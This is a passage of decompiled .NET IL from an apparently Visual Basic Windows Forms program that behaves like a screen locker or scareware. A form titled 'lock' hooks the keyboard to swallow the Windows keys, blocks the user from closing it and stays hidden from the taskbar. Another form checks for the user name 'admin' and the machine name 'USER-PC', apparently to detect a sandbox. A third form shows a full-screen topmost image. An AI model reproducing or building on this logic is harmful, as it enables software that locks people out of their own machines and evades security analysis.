    IL_0062:  ldarg.0
    IL_0063:  ldstr      "Form1"
    IL_0068:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Name(string)
    IL_006d:  ldarg.0
    IL_006e:  ldc.r8     0.5
    IL_0077:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Opacity(float64)
    IL_007c:  ldarg.0
    IL_007d:  ldc.i4.0
    IL_007e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ShowInTaskbar(bool)
    IL_0083:  ldarg.0
    IL_0084:  ldc.i4.1
    IL_0085:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_StartPosition(valuetype [System.Windows.Forms]System.Windows.Forms.FormStartPosition)
    IL_008a:  ldarg.0
    IL_008b:  ldstr      "lock"
    IL_0090:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Text(string)
    IL_0095:  ldarg.0
    IL_0096:  ldc.i4.2
    IL_0097:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_WindowState(valuetype [System.Windows.Forms]System.Windows.Forms.FormWindowState)
    IL_009c:  ldarg.0
    IL_009d:  ldc.i4.0
    IL_009e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::ResumeLayout(bool)
    IL_00a3:  ret
  } // end of method Form1::InitializeComponent

  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       28 (0x1c)
    .maxstack  8
    IL_0000:  ldnull
    IL_0001:  ldftn      native int Form1::HookCallback(int32,
                                                        native int,
                                                        native int)
    IL_0007:  newobj     instance void Form1/LowLevelKeyboardProc::.ctor(object,
                                                                         native int)
    IL_000c:  stsfld     class Form1/LowLevelKeyboardProc Form1::_proc
    IL_0011:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0016:  stsfld     native int Form1::_hookID
    IL_001b:  ret
  } // end of method Form1::.cctor

  .method private instance void  Form1_FormClosed(object sender,
                                                  class [System.Windows.Forms]System.Windows.Forms.FormClosedEventArgs e) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldsfld     native int Form1::_hookID
    IL_0005:  call       native int Form1::UnhookWindowsHookEx(native int)
    IL_000a:  pop
    IL_000b:  ret
  } // end of method Form1::Form1_FormClosed

  .method private instance void  Form1_FormClosing(object sender,
                                                   class [System.Windows.Forms]System.Windows.Forms.FormClosingEventArgs e) cil managed
  {
    // Code size       17 (0x11)
    .maxstack  8
    IL_0000:  ldarg.2
    IL_0001:  callvirt   instance valuetype [System.Windows.Forms]System.Windows.Forms.CloseReason [System.Windows.Forms]System.Windows.Forms.FormClosingEventArgs::get_CloseReason()
    IL_0006:  ldc.i4.3
    IL_0007:  bne.un.s   IL_0010

    IL_0009:  ldarg.2
    IL_000a:  ldc.i4.1
    IL_000b:  callvirt   instance void [System]System.ComponentModel.CancelEventArgs::set_Cancel(bool)
    IL_0010:  ret
  } // end of method Form1::Form1_FormClosing

  .method public static native int  HookCallback(int32 nCode,
                                                 native int wParam,
                                                 native int lParam) cil managed
  {
    // Code size       102 (0x66)
    .maxstack  4
    .locals init (valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_0,
             class [mscorlib]System.Exception V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.0
    IL_0002:  clt
    IL_0004:  ldc.i4.0
    IL_0005:  ceq
    IL_0007:  ldarg.1
    IL_0008:  ldc.i4     0x101
    IL_000d:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
    IL_0012:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                   native int)
    IL_0017:  and
    IL_0018:  brfalse.s  IL_0058

    IL_001a:  ldarg.2
    IL_001b:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::ReadInt32(native int)
    IL_0020:  stloc.0
    IL_0021:  ldloc.0
    IL_0022:  ldc.i4.s   91
    IL_0024:  ceq
    IL_0026:  ldloc.0
    IL_0027:  ldc.i4.s   92
    IL_0029:  ceq
    IL_002b:  or
    IL_002c:  brfalse.s  IL_0058

    .try
    {
      IL_002e:  ldc.i4     0xfb
      IL_0033:  ldc.i4.0
      IL_0034:  ldc.i4.1
      IL_0035:  conv.i8
      IL_0036:  ldc.i4.0
      IL_0037:  conv.i8
      IL_0038:  call       void Form1::keybd_event(uint8,
                                                   uint8,
                                                   int64,
                                                   int64)
      IL_003d:  leave.s    IL_0058

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003f:  dup
      IL_0040:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0045:  stloc.1
      IL_0046:  ldloc.1
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0056:  leave.s    IL_0058

    }  // end handler
    IL_0058:  ldsfld     native int Form1::_hookID
    IL_005d:  ldarg.0
    IL_005e:  ldarg.1
    IL_005f:  ldarg.2
    IL_0060:  call       native int Form1::CallNextHookEx(native int,
                                                          int32,
                                                          native int,
                                                          native int)
    IL_0065:  ret
  } // end of method Form1::HookCallback

  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  FindWindow(string lpClassName,
                                 string lpWindowName) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          bool  ShowWindow(native int hwnd,
                           int32 nCmdShow) cil managed preservesig
  {
  }
  .method family hidebysig specialname strict virtual 
          instance class [System.Windows.Forms]System.Windows.Forms.CreateParams 
          get_CreateParams() cil managed
  {
    // Code size       25 (0x19)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance class [System.Windows.Forms]System.Windows.Forms.CreateParams [System.Windows.Forms]System.Windows.Forms.Form::get_CreateParams()
    IL_0006:  dup
    IL_0007:  dup
    IL_0008:  callvirt   instance int32 [System.Windows.Forms]System.Windows.Forms.CreateParams::get_ClassStyle()
    IL_000d:  ldc.i4     0x200
    IL_0012:  or
    IL_0013:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.CreateParams::set_ClassStyle(int32)
    IL_0018:  ret
  } // end of method Form1::get_CreateParams

  .method private instance void  Form1_Load(object sender,
                                            class [mscorlib]System.EventArgs e) cil managed
  {
    // Code size       89 (0x59)
    .maxstack  2
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::BringToFront()
    IL_0006:  ldarg.0
    IL_0007:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Activate()
    IL_000c:  ldarg.0
    IL_000d:  call       instance bool [System.Windows.Forms]System.Windows.Forms.Control::Focus()
    IL_0012:  pop
    IL_0013:  ldsfld     class Form1/LowLevelKeyboardProc Form1::_proc
    IL_0018:  call       native int Form1::SetHook(class Form1/LowLevelKeyboardProc)
    IL_001d:  stsfld     native int Form1::_hookID
    IL_0022:  br.s       IL_003c

    IL_0024:  ldarg.0
    IL_0025:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Activate()
    IL_002a:  ldarg.0
    IL_002b:  call       instance bool [System.Windows.Forms]System.Windows.Forms.Control::Focus()
    IL_0030:  pop
    IL_0031:  ldarg.0
    IL_0032:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::BringToFront()
    IL_0037:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    IL_003c:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_0041:  ldstr      "\\select.dat"
    IL_0046:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_004b:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_0050:  brtrue.s   IL_0024

    IL_0052:  ldarg.0
    IL_0053:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::Hide()
    IL_0058:  ret
  } // end of method Form1::Form1_Load

  .method public static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  CallNextHookEx(native int hhk,
                                     int32 nCode,
                                     native int wParam,
                                     native int lParam) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          void  keybd_event(uint8 bVk,
                            uint8 bScan,
                            int64 dwFlags,
                            int64 dwExtraInfo) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32.dll" autochar lasterr winapi) 
          native int  GetModuleHandle(string& lpModuleName) cil managed preservesig
  {
  }
  .method private static native int  SetHook(class Form1/LowLevelKeyboardProc proc) cil managed
  {
    // Code size       33 (0x21)
    .maxstack  4
    .locals init (string V_0)
    IL_0000:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
    IL_0005:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
    IL_000a:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_ModuleName()
    IL_000f:  stloc.0
    IL_0010:  ldc.i4.s   13
    IL_0012:  ldarg.0
    IL_0013:  ldloca.s   V_0
    IL_0015:  call       native int Form1::GetModuleHandle(string&)
    IL_001a:  ldc.i4.0
    IL_001b:  call       native int Form1::SetWindowsHookEx(int32,
                                                            class Form1/LowLevelKeyboardProc,
                                                            native int,
                                                            uint32)
    IL_0020:  ret
  } // end of method Form1::SetHook

  .method public static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  SetWindowsHookEx(int32 idHook,
                                       class Form1/LowLevelKeyboardProc lpfn,
                                       native int hMod,
                                       uint32 dwThreadId) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  UnhookWindowsHookEx(native int hhk) cil managed preservesig
  {
  }
  .method private instance void  unfuck() cil managed
  {
    // Code size       1 (0x1)
    .maxstack  8
    IL_0000:  ret
  } // end of method Form1::unfuck

  .property instance class [System.Windows.Forms]System.Windows.Forms.CreateParams
          CreateParams()
  {
    .get instance class [System.Windows.Forms]System.Windows.Forms.CreateParams Form1::get_CreateParams()
  } // end of property Form1::CreateParams
} // end of class Form1

.class public auto ansi Form2
       extends [System.Windows.Forms]System.Windows.Forms.Form
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.DesignerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private class [System]System.ComponentModel.IContainer components
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.0
    IL_0008:  ldftn      instance void Form2::Form2_Load(object,
                                                         class [mscorlib]System.EventArgs)
    IL_000e:  newobj     instance void [mscorlib]System.EventHandler::.ctor(object,
                                                                            native int)
    IL_0013:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::add_Load(class [mscorlib]System.EventHandler)
    IL_0018:  ldarg.0
    IL_0019:  call       instance void Form2::InitializeComponent()
    IL_001e:  ret
  } // end of method Form2::.ctor

  .method family hidebysig strict virtual 
          instance void  Dispose(bool disposing) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       33 (0x21)
    .maxstack  2
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  brfalse.s  IL_0016

      IL_0003:  ldarg.0
      IL_0004:  ldfld      class [System]System.ComponentModel.IContainer Form2::components
      IL_0009:  brfalse.s  IL_0016

      IL_000b:  ldarg.0
      IL_000c:  ldfld      class [System]System.ComponentModel.IContainer Form2::components
      IL_0011:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0016:  leave.s    IL_0020

    }  // end .try
    finally
    {
      IL_0018:  ldarg.0
      IL_0019:  ldarg.1
      IL_001a:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Dispose(bool)
      IL_001f:  endfinally
    }  // end handler
    IL_0020:  ret
  } // end of method Form2::Dispose

  .method private instance void  InitializeComponent() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       172 (0xac)
    .maxstack  3
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::SuspendLayout()
    IL_0006:  ldarg.0
    IL_0007:  ldc.r4     6.
    IL_000c:  ldc.r4     13.
    IL_0011:  newobj     instance void [System.Drawing]System.Drawing.SizeF::.ctor(float32,
                                                                                   float32)
    IL_0016:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleDimensions(valuetype [System.Drawing]System.Drawing.SizeF)
    IL_001b:  ldarg.0
    IL_001c:  ldc.i4.1
    IL_001d:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleMode(valuetype [System.Windows.Forms]System.Windows.Forms.AutoScaleMode)
    IL_0022:  ldarg.0
    IL_0023:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Fuchsia()
    IL_0028:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_BackColor(valuetype [System.Drawing]System.Drawing.Color)
    IL_002d:  ldarg.0
    IL_002e:  ldc.i4.s   70
    IL_0030:  ldc.i4.s   24
    IL_0032:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_0037:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ClientSize(valuetype [System.Drawing]System.Drawing.Size)
    IL_003c:  ldarg.0
    IL_003d:  ldc.i4.0
    IL_003e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ControlBox(bool)
    IL_0043:  ldarg.0
    IL_0044:  ldc.i4.0
    IL_0045:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_FormBorderStyle(valuetype [System.Windows.Forms]System.Windows.Forms.FormBorderStyle)
    IL_004a:  ldarg.0
    IL_004b:  ldc.i4.0
    IL_004c:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_MaximizeBox(bool)
    IL_0051:  ldarg.0
    IL_0052:  ldc.i4.0
    IL_0053:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_MinimizeBox(bool)
    IL_0058:  ldarg.0
    IL_0059:  ldstr      "Form2"
    IL_005e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Name(string)
    IL_0063:  ldarg.0
    IL_0064:  ldc.r8     0.0
    IL_006d:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Opacity(float64)
    IL_0072:  ldarg.0
    IL_0073:  ldc.i4.0
    IL_0074:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ShowIcon(bool)
    IL_0079:  ldarg.0
    IL_007a:  ldc.i4.0
    IL_007b:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ShowInTaskbar(bool)
    IL_0080:  ldarg.0
    IL_0081:  ldc.i4.1
    IL_0082:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_StartPosition(valuetype [System.Windows.Forms]System.Windows.Forms.FormStartPosition)
    IL_0087:  ldarg.0
    IL_0088:  ldstr      "Form2"
    IL_008d:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Text(string)
    IL_0092:  ldarg.0
    IL_0093:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Fuchsia()
    IL_0098:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_TransparencyKey(valuetype [System.Drawing]System.Drawing.Color)
    IL_009d:  ldarg.0
    IL_009e:  ldc.i4.1
    IL_009f:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_WindowState(valuetype [System.Windows.Forms]System.Windows.Forms.FormWindowState)
    IL_00a4:  ldarg.0
    IL_00a5:  ldc.i4.0
    IL_00a6:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::ResumeLayout(bool)
    IL_00ab:  ret
  } // end of method Form2::InitializeComponent

  .method private instance void  Form2_Load(object sender,
                                            class [mscorlib]System.EventArgs e) cil managed
  {
    // Code size       102 (0x66)
    .maxstack  4
    IL_0000:  call       string [mscorlib]System.Environment::get_UserName()
    IL_0005:  ldstr      "admin"
    IL_000a:  ldc.i4.0
    IL_000b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0010:  ldc.i4.0
    IL_0011:  ceq
    IL_0013:  call       string [System.Windows.Forms]System.Windows.Forms.SystemInformation::get_ComputerName()
    IL_0018:  ldstr      "USER-PC"
    IL_001d:  ldc.i4.0
    IL_001e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0023:  ldc.i4.0
    IL_0024:  ceq
    IL_0026:  and
    IL_0027:  brfalse.s  IL_005f

    IL_0029:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_002e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0033:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_0038:  ldstr      "sand.dat"
    IL_003d:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0042:  ldc.i4.1
    IL_0043:  callvirt   instance class [mscorlib]System.IO.StreamWriter [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::OpenTextFileWriter(string,
                                                                                                                                                                     bool)
    IL_0048:  dup
    IL_0049:  ldstr      "001"
    IL_004e:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
    IL_0053:  callvirt   instance void [mscorlib]System.IO.StreamWriter::Close()
    IL_0058:  ldarg.0
    IL_0059:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::Hide()
    IL_005e:  ret

    IL_005f:  ldarg.0
    IL_0060:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::Hide()
    IL_0065:  ret
  } // end of method Form2::Form2_Load

} // end of class Form2

.class public auto ansi frmSustos
       extends [System.Windows.Forms]System.Windows.Forms.Form
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.DesignerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private class [System]System.ComponentModel.IContainer components
  .field private class [System.Windows.Forms]System.Windows.Forms.PictureBox _PictureBox1
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.AccessedThroughPropertyAttribute::.ctor(string) = ( 01 00 0B 50 69 63 74 75 72 65 42 6F 78 31 00 00 ) // ...PictureBox1..
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.0
    IL_0008:  ldftn      instance void frmSustos::frmSustos_Load(object,
                                                                 class [mscorlib]System.EventArgs)
    IL_000e:  newobj     instance void [mscorlib]System.EventHandler::.ctor(object,
                                                                            native int)
    IL_0013:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::add_Load(class [mscorlib]System.EventHandler)
    IL_0018:  ldarg.0
    IL_0019:  call       instance void frmSustos::InitializeComponent()
    IL_001e:  ret
  } // end of method frmSustos::.ctor

  .method family hidebysig strict virtual 
          instance void  Dispose(bool disposing) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       33 (0x21)
    .maxstack  2
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  brfalse.s  IL_0016

      IL_0003:  ldarg.0
      IL_0004:  ldfld      class [System]System.ComponentModel.IContainer frmSustos::components
      IL_0009:  brfalse.s  IL_0016

      IL_000b:  ldarg.0
      IL_000c:  ldfld      class [System]System.ComponentModel.IContainer frmSustos::components
      IL_0011:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0016:  leave.s    IL_0020

    }  // end .try
    finally
    {
      IL_0018:  ldarg.0
      IL_0019:  ldarg.1
      IL_001a:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Dispose(bool)
      IL_001f:  endfinally
    }  // end handler
    IL_0020:  ret
  } // end of method frmSustos::Dispose

  .method private instance void  InitializeComponent() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       268 (0x10c)
    .maxstack  3
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::.ctor()
    IL_0006:  callvirt   instance void frmSustos::set_PictureBox1(class [System.Windows.Forms]System.Windows.Forms.PictureBox)
    IL_000b:  ldarg.0
    IL_000c:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0011:  callvirt   instance void [System]System.ComponentModel.ISupportInitialize::BeginInit()
    IL_0016:  ldarg.0
    IL_0017:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::SuspendLayout()
    IL_001c:  ldarg.0
    IL_001d:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0022:  ldc.i4.5
    IL_0023:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Dock(valuetype [System.Windows.Forms]System.Windows.Forms.DockStyle)
    IL_0028:  ldarg.0
    IL_0029:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_002e:  ldc.i4.0
    IL_002f:  ldc.i4.0
    IL_0030:  newobj     instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                   int32)
    IL_0035:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Location(valuetype [System.Drawing]System.Drawing.Point)
    IL_003a:  ldarg.0
    IL_003b:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0040:  ldstr      "PictureBox1"
    IL_0045:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Name(string)
    IL_004a:  ldarg.0
    IL_004b:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0050:  ldc.i4     0x3f1
    IL_0055:  ldc.i4     0x27e
    IL_005a:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_005f:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Size(valuetype [System.Drawing]System.Drawing.Size)
    IL_0064:  ldarg.0
    IL_0065:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_006a:  ldc.i4.1
    IL_006b:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::set_SizeMode(valuetype [System.Windows.Forms]System.Windows.Forms.PictureBoxSizeMode)
    IL_0070:  ldarg.0
    IL_0071:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0076:  ldc.i4.0
    IL_0077:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::set_TabIndex(int32)
    IL_007c:  ldarg.0
    IL_007d:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_0082:  ldc.i4.0
    IL_0083:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::set_TabStop(bool)
    IL_0088:  ldarg.0
    IL_0089:  ldc.r4     6.
    IL_008e:  ldc.r4     13.
    IL_0093:  newobj     instance void [System.Drawing]System.Drawing.SizeF::.ctor(float32,
                                                                                   float32)
    IL_0098:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleDimensions(valuetype [System.Drawing]System.Drawing.SizeF)
    IL_009d:  ldarg.0
    IL_009e:  ldc.i4.1
    IL_009f:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleMode(valuetype [System.Windows.Forms]System.Windows.Forms.AutoScaleMode)
    IL_00a4:  ldarg.0
    IL_00a5:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Black()
    IL_00aa:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_BackColor(valuetype [System.Drawing]System.Drawing.Color)
    IL_00af:  ldarg.0
    IL_00b0:  ldc.i4     0x3f1
    IL_00b5:  ldc.i4     0x27e
    IL_00ba:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_00bf:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ClientSize(valuetype [System.Drawing]System.Drawing.Size)
    IL_00c4:  ldarg.0
    IL_00c5:  call       instance class [System.Windows.Forms]System.Windows.Forms.Control/ControlCollection [System.Windows.Forms]System.Windows.Forms.Control::get_Controls()
    IL_00ca:  ldarg.0
    IL_00cb:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_00d0:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control/ControlCollection::Add(class [System.Windows.Forms]System.Windows.Forms.Control)
    IL_00d5:  ldarg.0
    IL_00d6:  ldc.i4.0
    IL_00d7:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_FormBorderStyle(valuetype [System.Windows.Forms]System.Windows.Forms.FormBorderStyle)
    IL_00dc:  ldarg.0
    IL_00dd:  ldstr      "frmSustos"
    IL_00e2:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::set_Name(string)
    IL_00e7:  ldarg.0
    IL_00e8:  ldstr      "frmSustos"
    IL_00ed:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_Text(string)
    IL_00f2:  ldarg.0
    IL_00f3:  ldc.i4.2
    IL_00f4:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_WindowState(valuetype [System.Windows.Forms]System.Windows.Forms.FormWindowState)
    IL_00f9:  ldarg.0
    IL_00fa:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    IL_00ff:  callvirt   instance void [System]System.ComponentModel.ISupportInitialize::EndInit()
    IL_0104:  ldarg.0
    IL_0105:  ldc.i4.0
    IL_0106:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::ResumeLayout(bool)
    IL_010b:  ret
  } // end of method frmSustos::InitializeComponent

  .method assembly newslot specialname strict virtual 
          instance class [System.Windows.Forms]System.Windows.Forms.PictureBox 
          get_PictureBox1() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::_PictureBox1
    IL_0006:  ret
  } // end of method frmSustos::get_PictureBox1

  .method assembly newslot specialname strict virtual 
          instance void  set_PictureBox1(class [System.Windows.Forms]System.Windows.Forms.PictureBox WithEventsValue) cil managed synchronized
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::_PictureBox1
    IL_0007:  ret
  } // end of method frmSustos::set_PictureBox1

  .method family hidebysig specialname strict virtual 
          instance class [System.Windows.Forms]System.Windows.Forms.CreateParams 
          get_CreateParams() cil managed
  {
    // Code size       25 (0x19)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance class [System.Windows.Forms]System.Windows.Forms.CreateParams [System.Windows.Forms]System.Windows.Forms.Form::get_CreateParams()
    IL_0006:  dup
    IL_0007:  dup
    IL_0008:  callvirt   instance int32 [System.Windows.Forms]System.Windows.Forms.CreateParams::get_ClassStyle()
    IL_000d:  ldc.i4     0x200
    IL_0012:  or
    IL_0013:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.CreateParams::set_ClassStyle(int32)
    IL_0018:  ret
  } // end of method frmSustos::get_CreateParams

  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  SetWindowPos(int32 hwnd,
                              int32 hWndInsertAfter,
                              int32 x,
                              int32 y,
                              int32 cx,
                              int32 cy,
                              int32 wFlags) cil managed preservesig
  {
  }
  .method assembly instance void  MakeTopMostWindow(int64 hwnd,
                                                    bool MakeTopMostFlag) cil managed
  {
    // Code size       47 (0x2f)
    .maxstack  7
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  ldarg.2
    IL_0001:  brfalse.s  IL_0007

    IL_0003:  ldc.i4.m1
    IL_0004:  stloc.0
    IL_0005:  br.s       IL_000a

    IL_0007:  ldc.i4.s   -2
    IL_0009:  stloc.0
    IL_000a:  ldc.i4.2
    IL_000b:  ldc.i4.1
    IL_000c:  stloc.1
